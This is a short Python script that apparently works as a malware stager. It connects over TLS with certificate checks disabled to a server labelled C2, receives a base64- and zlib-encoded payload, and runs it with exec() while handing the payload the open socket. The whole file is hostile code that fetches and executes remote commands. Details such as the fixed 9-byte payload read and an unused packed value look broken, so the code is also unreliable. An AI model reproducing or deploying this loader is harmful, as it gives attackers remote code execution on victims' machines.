import socket
import ssl
import os
import threading
import time
import zlib
import base64
import struct

C2 = "10.0.2.15"
port = 443
context = ssl._create_unverified_context()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    with context.wrap_socket(sock, server_hostname=C2) as ssock:
        ssock.connect((C2, port))
        anon = struct.pack('<Q', 30000)[::-1]
        payload = ssock.recv(9)
        while len(payload) < 9:
            payload += ssock.recv(9 - len(payload))
        exec(zlib.decompress(base64.b64decode(payload)), {'s': ssock})